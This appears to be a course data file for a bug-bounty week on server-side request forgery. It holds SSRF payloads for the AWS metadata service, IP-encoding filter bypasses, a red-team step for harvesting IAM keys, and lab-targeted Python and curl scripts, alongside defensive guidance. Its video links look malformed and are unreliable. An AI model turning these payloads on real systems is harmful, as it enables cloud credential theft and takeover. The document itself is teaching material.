WEEK_8_DATA = {
    "week_number": 8,
    "title": "Server-Side Request Forgery (SSRF) & Cloud Metadata Attacks",
    "short_desc": "Abuse server-side HTTP clients to query cloud metadata endpoints (169.254.169.254), internal microservices, and loopbacks.",
    "flag": "FLAG{ssrf_cloud_metadata_aws_1092}",

    "analogy": """Server-Side Request Forgery (SSRF) is like tricking a trusted bank security guard into walking into the bank's internal vault room and handing you whatever documents are lying on the desk. Because the guard has internal access clearance that you lack, asking the guard to bring you 'whatever is on IP address 169.254.169.254' gives you full access to the keys!""",

    "overview": """Server-Side Request Forgery (SSRF) allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain or IP address specified by the attacker. In modern cloud environments (AWS, GCP, Azure, Kubernetes), SSRF is extremely critical because attackers target internal cloud instance metadata services (e.g., `http://169.254.169.254/latest/meta-data/iam/security-credentials/`) to harvest IAM secret access keys, access internal microservices (`http://127.0.0.1:8080/admin`), or pivot into protected internal networks.""",

    "learning_objectives": [
        "Differentiate between Regular (In-Band) SSRF and Blind (Out-of-Band) SSRF.",
        "Target cloud metadata endpoints across providers (AWS IMDSv1/IMDSv2, GCP metadata header, Azure instance metadata).",
        "Bypass SSRF filters using IP encoding tricks (decimal, hex, octal), DNS rebinding, and URL parser confusion.",
        "Leverage Out-of-Band (OAST) interaction tools like Burp Collaborator."
    ],

    "hunters_perspective": """SSRF is a P1 (Critical) vulnerability in cloud-native applications. Bug bounty hunters seek parameters that fetch external web resources: profile picture uploads via URL (`/upload?url=...`), PDF generation services (`/pdf?render_url=...`), webhook URL configurations, and web preview generators. Hunters substitute public URLs with loopbacks (`127.0.0.1`, `localhost`) or cloud metadata IPs (`169.254.169.254`).""",

    "root_cause": """The root cause is trusting user-supplied URLs in backend HTTP client calls (e.g., Python `requests.get(user_url)`, Node.js `axios.get(user_url)`) without validating hostnames against a strict domain whitelist or verifying that target IP addresses resolve to public, non-routable internet space.""",

    "code_audit_manual": """Code Review Manual for SSRF Detection:
1. Search codebase for HTTP client calls accepting user parameters (e.g., `requests.get`, `urllib.request.urlopen`, `cURL`, `HttpClient`).
2. Verify URL parser logic: ensure IP blacklisting is not vulnerable to DNS rebinding or decimal/octal encoding (`2852039166` instead of `169.254.169.254`).
3. Check cloud IMDS configuration: ensure AWS IMDSv2 (token-based session headers) is strictly enforced and IMDSv1 is disabled.
4. Verify network egress controls: backend application servers must operate within egress firewalls blocking access to `169.254.169.254` and `127.0.0.0/8`.""",

    "payload_logic": {
        "explanation": "SSRF payloads target loopbacks or cloud metadata services directly, using IP obfuscation or redirects to bypass naive regex filters.",
        "payloads": [
            "AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name",
            "Decimal IP Bypass: http://2852039166 (resolves to 169.254.169.254)",
            "Hex IP Bypass: http://0xa9fea9fe (resolves to 169.254.169.254)",
            "Localhost Bypass: http://127.0.0.1:8000 or http://localhost",
            "DNS Rebinding: http://spoofed-dns-to-169.254.169.254.nip.io"
        ]
    },

    "burp_suite_masterclass": """Burp Suite SSRF & Collaborator Masterclass:
1. Identifying SSRF Parameters: Intercept URL fetching requests in Proxy.
2. Burp Collaborator Integration: Right-click request -> Insert Collaborator Payload into target URL parameter (`url=http://xyz.oastify.com`).
3. Out-of-Band Verification: Check Collaborator tab for DNS and HTTP interactions triggered by target server.
4. Cloud Metadata Extraction: Replace URL parameter with `http://169.254.169.254/latest/meta-data/` in Repeater and analyze response payload for AWS IAM credentials.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Locate URL preview parameter, inject cloud metadata payload `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role`, extract `AccessKeyId`, `SecretAccessKey`, and `Token`, use AWS CLI to take over target cloud infrastructure.",
        "blue_team": "Defensive Posture: Implement domain whitelist validation for outgoing HTTP requests. Restrict egress network traffic at firewall/SG level to block `169.254.169.254`. Enforce AWS IMDSv2 (`HttpTokens=required`). Perform DNS resolution verification prior to executing HTTP requests."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - Server-Side Request Forgery (SSRF)",
        "portswigger_url": "https://portswigger.net/web-security/ssrf",
        "owasp_title": "OWASP Top 10:2021 - A10:2021-Server-Side Request Forgery (SSRF)",
        "owasp_url": "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 10: Attacking Backend Components (pp. 361-400)",
            "sub_chapter": "10.4 Server-Side Request Forgery",
            "analysis": "Stuttard & Pinto detail backend HTTP fetching vulnerabilities, internal network pivoting, and protocol smuggling."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 11: Server-Side Request Forgery (pp. 195-214)",
            "sub_chapter": "11.3 Cloud Metadata Attacks & IMDSv1 vs IMDSv2",
            "analysis": "Vickie Li demonstrates extracting AWS IAM credentials, GCP access tokens, and bypassing IP filter blacklists."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 8: Server-Side Request Forgery (pp. 169-192)",
            "sub_chapter": "8.2 Capital One Breach & Cloud Metadata SSRF",
            "analysis": "Peter Yaworski reviews real-world disclosures where SSRF led to multi-million-dollar cloud instance compromises."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 9: Cloud Security & SSRF (pp. 161-180)",
            "sub_chapter": "9.1 Generating IP Obfuscation Matrices",
            "analysis": "Barbosa shows using AI to convert IP addresses to decimal, hex, and octal representations for SSRF filter bypasses."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 10: Cloud & Infrastructure Hacking (pp. 219-242)",
            "sub_chapter": "10.1 Out-of-Band SSRF Exploitation",
            "analysis": "Vazquez & Javier walk through leveraging Burp Collaborator to confirm blind SSRF vulnerabilities."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 12: Web Scraping & HTTP Clients (pp. 267-300)",
            "sub_chapter": "12.7 Handling Redirects & Egress Filtering in requests",
            "analysis": "Sweigart presents code examples managing HTTP redirects and setting custom socket timeouts."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 4: Network Sockets & Proxies (pp. 55-74)",
            "sub_chapter": "4.3 Building a Custom SSRF Listener & Proxy",
            "analysis": "Seitz demonstrates building Python socket listeners to capture incoming out-of-band SSRF callbacks."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "SSRF Vulnerabilities Explained: Cloud Metadata & AWS Hacking",
            "youtube_url": "https://www.youtube.com/watch?v=8-4-u0i-H-1",
            "analysis_text": "David Bombal explains SSRF mechanics, demonstrating AWS 169.254.169.254 metadata exploitation."
        },
        {
            "creator": "Vickie Li",
            "title": "Server-Side Request Forgery (SSRF) Bug Bounty Masterclass",
            "youtube_url": "https://www.youtube.com/watch?v=0-s5e5c7W-1",
            "analysis_text": "Vickie Li demonstrates IP obfuscation, DNS rebinding, and exploiting blind SSRF vectors."
        },
        {
            "creator": "Ryan John",
            "title": "AWS Cloud Hacking via SSRF & IMDS Exploitation",
            "youtube_url": "https://www.youtube.com/watch?v=4-v3u-4-W-5",
            "analysis_text": "Ryan John presents a complete guide to harvesting AWS IAM keys via SSRF and using AWS CLI for post-exploitation."
        },
        {
            "creator": "John Hammond",
            "title": "SSRF Filter Bypasses & Burp Collaborator Deep Dive",
            "youtube_url": "https://www.youtube.com/watch?v=5-w3u-5-X-6",
            "analysis_text": "John Hammond performs a live demonstration testing URL parameters with Burp Collaborator to reveal blind SSRF."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "Capital One / AWS Bug Report",
                "title": "SSRF on WAF Instance Leaks AWS IAM Role Credentials",
                "bounty": "Historical Landmark Breach",
                "summary": "An SSRF vulnerability in a misconfigured WAF allowed access to AWS metadata endpoint `169.254.169.254`, exposing S3 bucket access keys."
            },
            {
                "target": "Shopify Bug Bounty Program",
                "title": "Blind SSRF via Webhook Setup Endpoint",
                "bounty": "$10,000",
                "summary": "A researcher triggered blind SSRF via a webhook URL parameter, capturing internal server headers via Burp Collaborator."
            }
        ],
        "programs": [
            {
                "name": "Shopify Vulnerability Rewards",
                "platform": "HackerOne",
                "scope": "*.shopify.com",
                "beginner_friendly": True
            },
            {
                "name": "GitLab Bug Bounty Program",
                "platform": "HackerOne",
                "scope": "*.gitlab.com",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for SSRF Bypass: Supply target validation rule: 'Backend blocks string 169.254.169.254 and 127.0.0.1. Generate 10 alternative IP representations (decimal, hex, octal, DNS rebinding) to reach the AWS metadata service: [INSERT RULE]'"
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Inspect parameter `url=http://example.com`. Change to `url=http://169.254.169.254/latest/meta-data/flag` to query the internal metadata service.",
            "guided_step": "Step 1: Submit GET request to `/lab-playground/week-8/target/?url=http://169.254.169.254/latest/meta-data/flag`.\nStep 2: Inspect returned AWS metadata text.\nStep 3: Extract Flag: FLAG{ssrf_cloud_metadata_aws_1092}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-8/target/`. Bypass server URL checks, target the internal metadata IP, and extract the flag."
        }
    },

    "automation_scripts": {
        "python_script": r"""# Python SSRF Metadata Extractor (exploit_week8.py)
import requests
import urllib.parse
import sys

METADATA_URLS = [
    "http://169.254.169.254/latest/meta-data/flag",
    "http://2852039166/latest/meta-data/flag",
    "http://0xa9fea9fe/latest/meta-data/flag",
    "http://127.0.0.1:8000/internal/flag"
]

def test_ssrf(target_url):
    print(f"[*] Testing SSRF Metadata Payloads on: {target_url}")
    for meta_url in METADATA_URLS:
        encoded_meta = urllib.parse.quote(meta_url)
        test_url = f"{target_url}?url={encoded_meta}"
        res = requests.get(test_url)
        print(f"[*] Payload: {meta_url} -> Status: {res.status_code}")
        if "FLAG{" in res.text:
            print(f"[!] SUCCESS: Cloud Metadata SSRF Flag Extracted!")
            print(f"    - Body: {res.text.strip()}")
            return

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-8/target/"
    test_ssrf(target)
""",
        "bash_script": """#!/bin/bash
# Bash SSRF Tester (recon_week8.sh)
TARGET_URL="http://localhost:8000/lab-playground/week-8/target/"

echo "[*] Sending SSRF metadata payload to $TARGET_URL"
curl -s "${TARGET_URL}?url=http://169.254.169.254/latest/meta-data/flag" | grep -i "FLAG{"
"""
    }
}
